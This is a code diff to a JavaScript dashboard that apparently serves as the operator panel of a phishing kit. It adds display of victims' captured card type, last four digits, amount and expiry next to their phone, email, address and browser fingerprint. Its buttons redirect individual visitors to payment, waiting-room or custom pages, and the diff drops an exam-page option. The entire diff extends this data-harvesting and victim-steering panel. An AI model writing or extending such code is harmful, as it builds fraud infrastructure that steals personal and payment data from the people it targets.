@@ -192,6 +192,18 @@ function statusBadge(v) {
 
 const cardMap = {};
 
+function paymentHTML(v) {
+    if (!v.payment_data) return '';
+    try {
+        const p = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
+        return `
+            <div class="vw-submitted-row" style="margin-top:4px;padding-top:6px;border-top:1px dashed #e2e8f0">
+                <span class="lbl" style="color:#16a34a">Paid</span>
+                <span class="val">${esc(p.card_type)} ****${esc(p.card_last4)} &middot; ${esc(p.amount)} &middot; ${esc(p.expiry)}</span>
+            </div>`;
+    } catch(e) { return ''; }
+}
+
 function createCard(v, grid) {
     const el = document.createElement('div');
     el.dataset.vid = v.id;
@@ -251,6 +263,16 @@ function updateCard(v) {
         const redirBtn = el.querySelector('[data-u="redir-btn"]');
         if (redirBtn) redirBtn.disabled = false;
     }
+
+    // Refresh submitted data section (picks up new payment data etc)
+    const sub = el.querySelector('[data-u="submitted"]');
+    if (sub && v.name) {
+        sub.innerHTML = `
+            ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
+            ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
+            ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+            ${paymentHTML(v)}`;
+    }
 }
 
 function buildInner(v) {
@@ -282,10 +304,11 @@ function buildInner(v) {
             <div class="vw-name">${esc(v.name)} ${esc(v.surname)}</div>
             <div class="vw-email">${esc(v.email)}</div>
         </div>
-        <div class="vw-submitted">
+        <div class="vw-submitted" data-u="submitted">
             ${v.phone ? `<div class="vw-submitted-row"><span class="lbl">Phone</span><span class="val">${esc(v.phone)}</span></div>` : ''}
             ${v.email ? `<div class="vw-submitted-row"><span class="lbl">Email</span><span class="val">${esc(v.email)}</span></div>` : ''}
             ${v.address ? `<div class="vw-submitted-row"><span class="lbl">Address</span><span class="val">${esc(v.address)}</span></div>` : ''}
+            ${paymentHTML(v)}
         </div>` : ''}
         <div class="vw-fp">
             <div class="vw-fp-title">Fingerprint</div>
@@ -307,7 +330,6 @@ function buildInner(v) {
         </div>
         <div class="vw-redirect-panel" id="redir-${v.id}">
             <div class="vw-redirect-options">
-                <button class="vw-redir-btn" onclick="doRedirect(${v.id},'exam.php')">Exam Page</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'payment.php')">Payment Page</button>
                 <button class="vw-redir-btn" onclick="doRedirect(${v.id},'waiting.php')">Waiting Room</button>
                 <input type="text" id="custom-url-${v.id}" placeholder="Custom URL..." style="padding:6px 10px;border:1.5px solid var(--border);border-radius:8px;font-size:.78rem;flex:1;min-width:120px">
